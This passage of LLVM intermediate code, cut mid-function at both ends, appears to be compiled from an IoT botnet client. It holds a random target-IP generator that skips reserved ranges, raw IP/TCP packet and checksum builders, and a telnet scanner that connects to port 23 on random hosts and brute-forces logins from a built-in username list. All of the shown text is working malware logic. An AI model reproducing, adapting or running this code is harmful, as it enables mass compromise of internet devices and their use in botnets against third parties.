  %14 = load i8, i8* @TelnetIPRanges.ipState.0, align 1
  switch i8 %14, label %18 [
    i8 127, label %.critedge.backedge
    i8 0, label %.critedge.backedge
    i8 3, label %.critedge.backedge
    i8 15, label %.critedge.backedge
    i8 16, label %.critedge.backedge
    i8 56, label %.critedge.backedge
    i8 10, label %.critedge.backedge
    i8 -64, label %15
  ]

.critedge.backedge:                               ; preds = %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %15, %19, %23, %26, %.thread40, %.thread40, %.thread40, %.thread40, %.thread40, %.thread40, %.thread40, %.thread40, %.thread40, %.thread40, %.thread40, %.thread40, %.thread40, %.thread40, %29
  br label %.critedge

; <label>:15:                                     ; preds = %.critedge
  %16 = load i8, i8* @TelnetIPRanges.ipState.1, align 1
  %17 = icmp eq i8 %16, -88
  br i1 %17, label %.critedge.backedge, label %.thread37

; <label>:18:                                     ; preds = %.critedge
  switch i8 %14, label %26 [
    i8 -84, label %19
    i8 100, label %23
  ]

; <label>:19:                                     ; preds = %18
  %20 = load i8, i8* @TelnetIPRanges.ipState.1, align 1
  %21 = and i8 %20, -16
  %22 = icmp eq i8 %21, 16
  br i1 %22, label %.critedge.backedge, label %.thread37

.thread37:                                        ; preds = %15, %19
  %.pre38 = load i8, i8* @TelnetIPRanges.ipState.1, align 1
  br label %.thread40

; <label>:23:                                     ; preds = %18
  %24 = load i8, i8* @TelnetIPRanges.ipState.1, align 1
  %.off = add i8 %24, -64
  %25 = icmp ult i8 %.off, 63
  br i1 %25, label %.critedge.backedge, label %.thread40.thread

; <label>:26:                                     ; preds = %18
  %.pre = load i8, i8* @TelnetIPRanges.ipState.1, align 1
  %27 = icmp eq i8 %14, -87
  %28 = icmp eq i8 %.pre, -1
  %or.cond31 = and i1 %27, %28
  br i1 %or.cond31, label %.critedge.backedge, label %29

; <label>:29:                                     ; preds = %26
  %30 = icmp eq i8 %14, -58
  %31 = and i8 %.pre, -2
  %32 = icmp eq i8 %31, 18
  %or.cond = and i1 %30, %32
  br i1 %or.cond, label %.critedge.backedge, label %.thread40

.thread40:                                        ; preds = %.thread37, %29
  %33 = phi i8 [ %.pre, %29 ], [ %.pre38, %.thread37 ]
  switch i8 %14, label %.thread40.thread [
    i8 -32, label %.critedge.backedge
    i8 6, label %.critedge.backedge
    i8 7, label %.critedge.backedge
    i8 11, label %.critedge.backedge
    i8 21, label %.critedge.backedge
    i8 22, label %.critedge.backedge
    i8 26, label %.critedge.backedge
    i8 28, label %.critedge.backedge
    i8 29, label %.critedge.backedge
    i8 30, label %.critedge.backedge
    i8 33, label %.critedge.backedge
    i8 55, label %.critedge.backedge
    i8 -42, label %.critedge.backedge
    i8 -41, label %.critedge.backedge
  ]

.thread40.thread:                                 ; preds = %23, %.thread40
  %34 = phi i8 [ %33, %.thread40 ], [ %24, %23 ]
  %35 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %35, i8 0, i64 16, i32 16, i1 false)
  %36 = zext i8 %14 to i32
  %37 = zext i8 %34 to i32
  %38 = load i8, i8* @TelnetIPRanges.ipState.2, align 1
  %39 = zext i8 %38 to i32
  %40 = and i32 %12, 255
  %41 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %35, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.114, i64 0, i64 0), i32 %36, i32 %37, i32 %39, i32 %40)
  %42 = call i32 @inet_addr(i8* nonnull %35) #7
  ret i32 %42
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) local_unnamed_addr #2 {
  %2 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %3 = tail call i32 @ntohl(i32 %2) #15
  %4 = and i32 %3, %0
  %5 = tail call i32 @rand_cmwc()
  %6 = xor i32 %0, -1
  %7 = and i32 %5, %6
  %8 = xor i32 %7, %4
  ret i32 %8
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #9

; Function Attrs: noinline norecurse nounwind readonly uwtable
define zeroext i16 @csum(i16* nocapture readonly, i32) local_unnamed_addr #10 {
  %3 = icmp sgt i32 %1, 1
  br i1 %3, label %.lr.ph16.preheader, label %._crit_edge17

.lr.ph16.preheader:                               ; preds = %2
  %4 = add i32 %1, -2
  %5 = lshr i32 %4, 1
  %addconv = add nuw i32 %5, 1
  %6 = zext i32 %addconv to i64
  %7 = shl nuw i32 %5, 1
  %addconv33 = add nuw i32 %5, 1
  %min.iters.check = icmp ult i32 %addconv33, 4
  br i1 %min.iters.check, label %.lr.ph16.preheader34, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph16.preheader
  %8 = zext i32 %addconv33 to i64
  %9 = and i32 %addconv33, 3
  %n.mod.vf = zext i32 %9 to i64
  %n.vec = sub nsw i64 %8, %n.mod.vf
  %cmp.zero = icmp eq i64 %n.vec, 0
  %cast.crd = trunc i64 %n.vec to i32
  %10 = shl i32 %cast.crd, 1
  %ind.end = sub i32 %1, %10
  %ind.end27 = getelementptr i16, i16* %0, i64 %n.vec
  br i1 %cmp.zero, label %.lr.ph16.preheader34, label %vector.body.preheader

vector.body.preheader:                            ; preds = %min.iters.checked
  br label %vector.body

vector.body:                                      ; preds = %vector.body.preheader, %vector.body
  %index = phi i64 [ %index.next, %vector.body ], [ 0, %vector.body.preheader ]
  %vec.phi = phi <2 x i64> [ %16, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %vec.phi28 = phi <2 x i64> [ %17, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %next.gep = getelementptr i16, i16* %0, i64 %index
  %11 = bitcast i16* %next.gep to <2 x i16>*
  %wide.load = load <2 x i16>, <2 x i16>* %11, align 2
  %12 = getelementptr i16, i16* %next.gep, i64 2
  %13 = bitcast i16* %12 to <2 x i16>*
  %wide.load31 = load <2 x i16>, <2 x i16>* %13, align 2
  %14 = zext <2 x i16> %wide.load to <2 x i64>
  %15 = zext <2 x i16> %wide.load31 to <2 x i64>
  %16 = add <2 x i64> %14, %vec.phi
  %17 = add <2 x i64> %15, %vec.phi28
  %index.next = add i64 %index, 4
  %18 = icmp eq i64 %index.next, %n.vec
  br i1 %18, label %middle.block, label %vector.body, !llvm.loop !16

middle.block:                                     ; preds = %vector.body
  %bin.rdx = add <2 x i64> %17, %16
  %rdx.shuf = shufflevector <2 x i64> %bin.rdx, <2 x i64> undef, <2 x i32> <i32 1, i32 undef>
  %bin.rdx32 = add <2 x i64> %bin.rdx, %rdx.shuf
  %19 = extractelement <2 x i64> %bin.rdx32, i32 0
  %cmp.n = icmp eq i32 %9, 0
  br i1 %cmp.n, label %._crit_edge17.loopexit, label %.lr.ph16.preheader34

.lr.ph16.preheader34:                             ; preds = %middle.block, %min.iters.checked, %.lr.ph16.preheader
  %.014.ph = phi i64 [ 0, %min.iters.checked ], [ 0, %.lr.ph16.preheader ], [ %19, %middle.block ]
  %.0913.ph = phi i32 [ %1, %min.iters.checked ], [ %1, %.lr.ph16.preheader ], [ %ind.end, %middle.block ]
  %.01012.ph = phi i16* [ %0, %min.iters.checked ], [ %0, %.lr.ph16.preheader ], [ %ind.end27, %middle.block ]
  br label %.lr.ph16

.lr.ph16:                                         ; preds = %.lr.ph16.preheader34, %.lr.ph16
  %.014 = phi i64 [ %23, %.lr.ph16 ], [ %.014.ph, %.lr.ph16.preheader34 ]
  %.0913 = phi i32 [ %24, %.lr.ph16 ], [ %.0913.ph, %.lr.ph16.preheader34 ]
  %.01012 = phi i16* [ %20, %.lr.ph16 ], [ %.01012.ph, %.lr.ph16.preheader34 ]
  %20 = getelementptr inbounds i16, i16* %.01012, i64 1
  %21 = load i16, i16* %.01012, align 2
  %22 = zext i16 %21 to i64
  %23 = add i64 %22, %.014
  %24 = add nsw i32 %.0913, -2
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %.lr.ph16, label %._crit_edge17.loopexit.loopexit, !llvm.loop !17

._crit_edge17.loopexit.loopexit:                  ; preds = %.lr.ph16
  br label %._crit_edge17.loopexit

._crit_edge17.loopexit:                           ; preds = %._crit_edge17.loopexit.loopexit, %middle.block
  %.lcssa25 = phi i64 [ %19, %middle.block ], [ %23, %._crit_edge17.loopexit.loopexit ]
  %scevgep = getelementptr i16, i16* %0, i64 %6
  %26 = sub i32 %4, %7
  br label %._crit_edge17

._crit_edge17:                                    ; preds = %._crit_edge17.loopexit, %2
  %.010.lcssa = phi i16* [ %0, %2 ], [ %scevgep, %._crit_edge17.loopexit ]
  %.09.lcssa = phi i32 [ %1, %2 ], [ %26, %._crit_edge17.loopexit ]
  %.0.lcssa = phi i64 [ 0, %2 ], [ %.lcssa25, %._crit_edge17.loopexit ]
  %27 = icmp eq i32 %.09.lcssa, 1
  br i1 %27, label %28, label %.preheader

; <label>:28:                                     ; preds = %._crit_edge17
  %29 = bitcast i16* %.010.lcssa to i8*
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i64
  %32 = add i64 %31, %.0.lcssa
  br label %.preheader

.preheader:                                       ; preds = %28, %._crit_edge17
  %.1.ph = phi i64 [ %.0.lcssa, %._crit_edge17 ], [ %32, %28 ]
  %33 = lshr i64 %.1.ph, 16
  %34 = icmp eq i64 %33, 0
  br i1 %34, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %35 = phi i64 [ %38, %.lr.ph ], [ %33, %.lr.ph.preheader ]
  %.111 = phi i64 [ %37, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %36 = and i64 %.111, 65535
  %37 = add nuw nsw i64 %36, %35
  %38 = lshr i64 %37, 16
  %39 = icmp eq i64 %38, 0
  br i1 %39, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.1.lcssa = phi i64 [ %.1.ph, %.preheader ], [ %37, %._crit_edge.loopexit ]
  %40 = trunc i64 %.1.lcssa to i16
  %41 = xor i16 %40, -1
  ret i16 %41
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr* nocapture readonly, %struct.tcphdr* nocapture readonly) local_unnamed_addr #2 {
  %3 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %4 = bitcast i32* %3 to <2 x i32>*
  %5 = load <2 x i32>, <2 x i32>* %4, align 4
  %6 = zext <2 x i32> %5 to <2 x i64>
  %7 = tail call zeroext i16 @htons(i16 zeroext 20) #15
  %8 = tail call noalias i8* @malloc(i64 44) #7
  %9 = bitcast i8* %8 to i16*
  %10 = bitcast i8* %8 to <2 x i64>*
  store <2 x i64> %6, <2 x i64>* %10, align 1
  %.sroa.3.0..sroa_idx = getelementptr inbounds i8, i8* %8, i64 16
  store i8 0, i8* %.sroa.3.0..sroa_idx, align 1
  %.sroa.4.0..sroa_raw_idx = getelementptr inbounds i8, i8* %8, i64 17
  store i8 6, i8* %.sroa.4.0..sroa_raw_idx, align 1
  %.sroa.5.0..sroa_idx7 = getelementptr inbounds i8, i8* %8, i64 18
  %11 = bitcast i8* %.sroa.5.0..sroa_idx7 to i16*
  store i16 %7, i16* %11, align 1
  %12 = getelementptr inbounds i8, i8* %8, i64 24
  %13 = bitcast %struct.tcphdr* %1 to i8*
  tail call void @llvm.memcpy.p0i8.p0i8.i64(i8* %12, i8* %13, i64 20, i32 1, i1 false)
  %14 = tail call zeroext i16 @csum(i16* %9, i32 44)
  tail call void @free(i8* %8) #7
  ret i16 %14
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #4

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeIPPacket(%struct.iphdr* nocapture, i32, i32, i8 zeroext, i32) local_unnamed_addr #1 {
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 0
  store i8 69, i8* %6, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 1
  store i8 0, i8* %7, align 1
  %8 = trunc i32 %4 to i16
  %9 = add i16 %8, 20
  %10 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 2
  store i16 %9, i16* %10, align 2
  %11 = tail call i32 @rand_cmwc()
  %12 = trunc i32 %11 to i16
  %13 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 3
  store i16 %12, i16* %13, align 4
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 4
  store i16 0, i16* %14, align 2
  %15 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 5
  store i8 -1, i8* %15, align 4
  %16 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  store i8 %3, i8* %16, align 1
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 7
  store i16 0, i16* %17, align 2
  %18 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  store i32 %2, i32* %18, align 4
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  store i32 %1, i32* %19, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) local_unnamed_addr #2 {
  %2 = icmp slt i32 %0, 3
  br i1 %2, label %5, label %3

; <label>:3:                                      ; preds = %1
  %4 = tail call i32 @close(i32 %0) #7
  br label %5

; <label>:5:                                      ; preds = %1, %3
  %.0 = phi i32 [ 0, %3 ], [ 1, %1 ]
  ret i32 %.0
}

; Function Attrs: noinline noreturn nounwind uwtable
define void @TelnetScanner(i32, i32) local_unnamed_addr #11 {
  %3 = alloca %struct.fd_set, align 8
  %4 = alloca %struct.timeval, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca [80 x i8], align 16
  %9 = tail call i32 @getdtablesize() #7
  %10 = add nsw i32 %9, -100
  %11 = icmp sgt i32 %10, %1
  %. = select i1 %11, i32 %1, i32 %10
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 0
  store i16 2, i16* %12, align 4
  %13 = tail call zeroext i16 @htons(i16 zeroext 23) #15
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 1
  store i16 %13, i16* %14, align 2
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 3, i64 0
  %16 = bitcast i8* %15 to i64*
  store i64 0, i64* %16, align 4
  %17 = tail call noalias i8* @malloc(i64 1025) #7
  tail call void @llvm.memset.p0i8.i64(i8* %17, i8 0, i64 1025, i32 1, i1 false)
  %18 = zext i32 %. to i64
  %19 = alloca %struct.telstate_t, i64 %18, align 16
  %20 = bitcast %struct.telstate_t* %19 to i8*
  %21 = sext i32 %. to i64
  %22 = mul nsw i64 %21, 5
  call void @llvm.memset.p0i8.i64(i8* nonnull %20, i8 0, i64 %22, i32 16, i1 false)
  %23 = icmp sgt i32 %., 0
  br i1 %23, label %.lr.ph122.preheader, label %.preheader

.lr.ph122.preheader:                              ; preds = %2
  %xtraiter = and i64 %21, 1
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph122.prol.loopexit, label %.lr.ph122.prol.preheader

.lr.ph122.prol.preheader:                         ; preds = %.lr.ph122.preheader
  br label %.lr.ph122.prol

.lr.ph122.prol:                                   ; preds = %.lr.ph122.prol.preheader
  %24 = bitcast %struct.telstate_t* %19 to i8*
  call void @llvm.memset.p0i8.i64(i8* %24, i8 0, i64 32, i32 16, i1 false)
  %25 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 0, i32 3
  store i8 1, i8* %25, align 1
  %26 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 0, i32 9
  store i8* %17, i8** %26, align 8
  br label %.lr.ph122.prol.loopexit

.lr.ph122.prol.loopexit:                          ; preds = %.lr.ph122.preheader, %.lr.ph122.prol
  %indvars.iv.unr = phi i64 [ 0, %.lr.ph122.preheader ], [ 1, %.lr.ph122.prol ]
  %27 = icmp eq i32 %., 1
  br i1 %27, label %.preheader.loopexit, label %.lr.ph122.preheader.new

.lr.ph122.preheader.new:                          ; preds = %.lr.ph122.prol.loopexit
  br label %.lr.ph122

.preheader.loopexit.unr-lcssa:                    ; preds = %.lr.ph122
  br label %.preheader.loopexit

.preheader.loopexit:                              ; preds = %.lr.ph122.prol.loopexit, %.preheader.loopexit.unr-lcssa
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %2
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2, i32 0
  %29 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %3, i64 0, i32 0, i64 0
  %30 = sext i32 %0 to i64
  %31 = bitcast i32* %6 to i8*
  br label %.loopexit

.lr.ph122:                                        ; preds = %.lr.ph122, %.lr.ph122.preheader.new
  %indvars.iv = phi i64 [ %indvars.iv.unr, %.lr.ph122.preheader.new ], [ %indvars.iv.next.1, %.lr.ph122 ]
  %32 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %indvars.iv
  %33 = bitcast %struct.telstate_t* %32 to i8*
  call void @llvm.memset.p0i8.i64(i8* %33, i8 0, i64 32, i32 16, i1 false)
  %34 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %indvars.iv, i32 3
  store i8 1, i8* %34, align 1
  %35 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %indvars.iv, i32 9
  store i8* %17, i8** %35, align 8
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %36 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %indvars.iv.next
  %37 = bitcast %struct.telstate_t* %36 to i8*
  call void @llvm.memset.p0i8.i64(i8* %37, i8 0, i64 32, i32 16, i1 false)
  %38 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %indvars.iv.next, i32 3
  store i8 1, i8* %38, align 1
  %39 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %indvars.iv.next, i32 9
  store i8* %17, i8** %39, align 8
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  %40 = icmp slt i64 %indvars.iv.next.1, %21
  br i1 %40, label %.lr.ph122, label %.preheader.loopexit.unr-lcssa

.loopexit:                                        ; preds = %.loopexit, %.preheader
  br i1 %23, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  %41 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %42 = getelementptr inbounds %struct.timeval, %struct.timeval* %4, i64 0, i32 0
  %43 = getelementptr inbounds %struct.timeval, %struct.timeval* %4, i64 0, i32 1
  %44 = getelementptr inbounds [80 x i8], [80 x i8]* %8, i64 0, i64 0
  br label %.lr.ph

.lr.ph:                                           ; preds = %356, %.lr.ph.preheader
  %.1120 = phi i32 [ %.mux, %356 ], [ 0, %.lr.ph.preheader ]
  %45 = sext i32 %.1120 to i64
  %46 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %45
  %47 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %45, i32 7
  %48 = load i32, i32* %47, align 16
  %49 = icmp eq i32 %48, 0
  br i1 %49, label %50, label %53

; <label>:50:                                     ; preds = %.lr.ph
  %51 = call i64 @time(i64* null) #7
  %52 = trunc i64 %51 to i32
  store i32 %52, i32* %47, align 16
  br label %53

; <label>:53:                                     ; preds = %50, %.lr.ph
  %54 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %45, i32 2
  %55 = load i8, i8* %54, align 8
  switch i8 %55, label %356 [
    i8 0, label %56
    i8 1, label %97
    i8 2, label %132
    i8 3, label %154
    i8 4, label %172
    i8 5, label %194
    i8 6, label %212
    i8 7, label %257
    i8 8, label %280
  ]

; <label>:56:                                     ; preds = %53
  %57 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %45, i32 3
  %58 = load i8, i8* %57, align 1
  switch i8 %58, label %78 [
    i8 1, label %59
    i8 0, label %66
  ]

; <label>:59:                                     ; preds = %56
  %60 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %45, i32 9
  %61 = bitcast i8** %60 to i64*
  %62 = load i64, i64* %61, align 8
  %63 = bitcast %struct.telstate_t* %46 to i8*
  call void @llvm.memset.p0i8.i64(i8* %63, i8 0, i64 32, i32 16, i1 false)
  store i64 %62, i64* %61, align 8
  %64 = call i32 @TelnetIPRanges()
  %65 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %45, i32 1
  store i32 %64, i32* %65, align 4
  br label %78

; <label>:66:                                     ; preds = %56
  %67 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %45, i32 4
  %68 = load i8, i8* %67, align 2
  %69 = add i8 %68, 1
  store i8 %69, i8* %67, align 2
  %70 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %45, i32 5
  %71 = load i8, i8* %70, align 1
  %72 = add i8 %71, 1
  store i8 %72, i8* %70, align 1
  %73 = icmp eq i8 %72, 6
  br i1 %73, label %74, label %75

; <label>:74:                                     ; preds = %66
  store i8 1, i8* %57, align 1
  br label %75

; <label>:75:                                     ; preds = %74, %66
  %76 = icmp eq i8 %69, 6
  br i1 %76, label %77, label %78

; <label>:77:                                     ; preds = %75
  store i8 1, i8* %57, align 1
  br label %356

; <label>:78:                                     ; preds = %56, %75, %59
  store i16 2, i16* %12, align 4
  store i16 %13, i16* %14, align 2
  store i64 0, i64* %16, align 4
  %79 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %45, i32 1
  %80 = load i32, i32* %79, align 4
  store i32 %80, i32* %28, align 4
  %81 = call i32 @socket(i32 2, i32 1, i32 0) #7
  %82 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 0, i32 0
  store i32 %81, i32* %82, align 16
  %83 = icmp eq i32 %81, -1
  br i1 %83, label %356, label %84

; <label>:84:                                     ; preds = %78
  %85 = call i32 (i32, i32, ...) @fcntl(i32 %81, i32 3, i8* null) #7
  %86 = or i32 %85, 2048
  %87 = call i32 (i32, i32, ...) @fcntl(i32 %81, i32 4, i32 %86) #7
  %88 = load i32, i32* %82, align 16
  %89 = call i32 @connect(i32 %88, %struct.sockaddr* nonnull %41, i32 16) #7
  %90 = icmp eq i32 %89, -1
  br i1 %90, label %91, label %96

; <label>:91:                                     ; preds = %84
  %92 = tail call i32* @__errno_location() #15
  %93 = load i32, i32* %92, align 4
  %94 = icmp eq i32 %93, 115
  br i1 %94, label %96, label %95

; <label>:95:                                     ; preds = %91
  call void @reset_telstate(%struct.telstate_t* nonnull %46)
  br label %356

; <label>:96:                                     ; preds = %91, %84
  call void @advance_telstate(%struct.telstate_t* nonnull %46, i32 1)
  br label %356

; <label>:97:                                     ; preds = %53
  %98 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %29) #7, !srcloc !19
  %99 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 0, i32 0
  %100 = load i32, i32* %99, align 16
  %101 = srem i32 %100, 64
  %102 = zext i32 %101 to i64
  %103 = shl i64 1, %102
  %104 = sdiv i32 %100, 64
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %3, i64 0, i32 0, i64 %105
  %107 = load i64, i64* %106, align 8
  %108 = or i64 %103, %107
  store i64 %108, i64* %106, align 8
  store i64 0, i64* %42, align 8
  store i64 %30, i64* %43, align 8
  %109 = add nsw i32 %100, 1
  %110 = call i32 @select(i32 %109, %struct.fd_set* null, %struct.fd_set* nonnull %3, %struct.fd_set* null, %struct.timeval* nonnull %4) #7
  switch i32 %110, label %125 [
    i32 1, label %111
    i32 -1, label %124
  ]

; <label>:111:                                    ; preds = %97
  %112 = call i64 @time(i64* null) #7
  %113 = trunc i64 %112 to i32
  store i32 %113, i32* %47, align 16
  store i32 4, i32* %5, align 4
  store i32 0, i32* %6, align 4
  %114 = load i32, i32* %99, align 16
  %115 = call i32 @getsockopt(i32 %114, i32 1, i32 4, i8* nonnull %31, i32* nonnull %5) #7
  %116 = load i32, i32* %6, align 4
  %117 = icmp eq i32 %116, 0
  br i1 %117, label %119, label %118

; <label>:118:                                    ; preds = %111
  call void @reset_telstate(%struct.telstate_t* nonnull %46)
  br label %356

; <label>:119:                                    ; preds = %111
  %120 = load i32, i32* %99, align 16
  %121 = call i32 (i32, i32, ...) @fcntl(i32 %120, i32 3, i8* null) #7
  %122 = and i32 %121, -2049
  %123 = call i32 (i32, i32, ...) @fcntl(i32 %120, i32 4, i32 %122) #7
  call void @advance_telstate(%struct.telstate_t* nonnull %46, i32 2)
  br label %356

; <label>:124:                                    ; preds = %97
  call void @reset_telstate(%struct.telstate_t* nonnull %46)
  br label %356

; <label>:125:                                    ; preds = %97
  %126 = load i32, i32* %47, align 16
  %127 = add i32 %126, 7
  %128 = zext i32 %127 to i64
  %129 = call i64 @time(i64* null) #7
  %130 = icmp slt i64 %128, %129
  br i1 %130, label %131, label %356

; <label>:131:                                    ; preds = %125
  call void @reset_telstate(%struct.telstate_t* nonnull %46)
  br label %356

; <label>:132:                                    ; preds = %53
  %133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 0, i32 0
  %134 = load i32, i32* %133, align 16
  %135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %45, i32 9
  %136 = load i8*, i8** %135, align 8
  %137 = call i32 @read_until_response(i32 %134, i32 %0, i8* %136, i32 1024, i8** getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i64 0, i64 0))
  %138 = icmp eq i32 %137, 0
  br i1 %138, label %147, label %139

; <label>:139:                                    ; preds = %132
  %140 = call i64 @time(i64* null) #7
  %141 = trunc i64 %140 to i32
  store i32 %141, i32* %47, align 16
  %142 = load i8*, i8** %135, align 8
  %143 = call i32 @contains_fail(i8* %142)
  %144 = icmp eq i32 %143, 0
  br i1 %144, label %146, label %145

; <label>:145:                                    ; preds = %139
  call void @advance_telstate(%struct.telstate_t* nonnull %46, i32 0)
  br label %356

; <label>:146:                                    ; preds = %139
  call void @advance_telstate(%struct.telstate_t* nonnull %46, i32 3)
  br label %356

; <label>:147:                                    ; preds = %132
  %148 = load i32, i32* %47, align 16
  %149 = add i32 %148, 7
  %150 = zext i32 %149 to i64
  %151 = call i64 @time(i64* null) #7
  %152 = icmp slt i64 %150, %151
  br i1 %152, label %153, label %356

; <label>:153:                                    ; preds = %147
  call void @reset_telstate(%struct.telstate_t* nonnull %46)
  br label %356

; <label>:154:                                    ; preds = %53
  %155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 0, i32 0
  %156 = load i32, i32* %155, align 16
  %157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %45, i32 4
  %158 = load i8, i8* %157, align 2
  %159 = zext i8 %158 to i64
  %160 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_usernames, i64 0, i64 %159
  %161 = load i8*, i8** %160, align 8
  %162 = call i64 @strlen(i8* %161) #14
  %163 = call i64 @send(i32 %156, i8* %161, i64 %162, i32 16384) #7
  %164 = icmp slt i64 %163, 0
  br i1 %164, label %165, label %166

; <label>:165:                                    ; preds = %154
  call void @reset_telstate(%struct.telstate_t* nonnull %46)
  br label %356

; <label>:166:                                    ; preds = %154
  %167 = load i32, i32* %155, align 16
  %168 = call i64 @send(i32 %167, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.115, i64 0, i64 0), i64 2, i32 16384) #7
  %169 = icmp slt i64 %168, 0
  br i1 %169, label %170, label %171

; <label>:170:                                    ; preds = %166
  call void @reset_telstate(%struct.telstate_t* nonnull %46)
  br label %356

; <label>:171:                                    ; preds = %166
  call void @advance_telstate(%struct.telstate_t* nonnull %46, i32 4)
  br label %356

; <label>:172:                                    ; preds = %53
  %173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 0, i32 0
  %174 = load i32, i32* %173, align 16
  %175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %45, i32 9
  %176 = load i8*, i8** %175, align 8
  %177 = call i32 @read_until_response(i32 %174, i32 %0, i8* %176, i32 1024, i8** getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i64 0, i64 0))
  %178 = icmp eq i32 %177, 0
  br i1 %178, label %187, label %179

; <label>:179:                                    ; preds = %172
  %180 = call i64 @time(i64* null) #7
  %181 = trunc i64 %180 to i32
  store i32 %181, i32* %47, align 16
  %182 = load i8*, i8** %175, align 8
  %183 = call i32 @contains_fail(i8* %182)
  %184 = icmp eq i32 %183, 0
  br i1 %184, label %186, label %185

; <label>:185:                                    ; preds = %179
  call void @advance_telstate(%struct.telstate_t* nonnull %46, i32 0)
  br label %356

; <label>:186:                                    ; preds = %179
  call void @advance_telstate(%struct.telstate_t* nonnull %46, i32 5)
  br label %356

; <label>:187:                                    ; preds = %172
  %188 = load i32, i32* %47, align 16
  %189 = add i32 %188, 7
  %190 = zext i32 %189 to i64
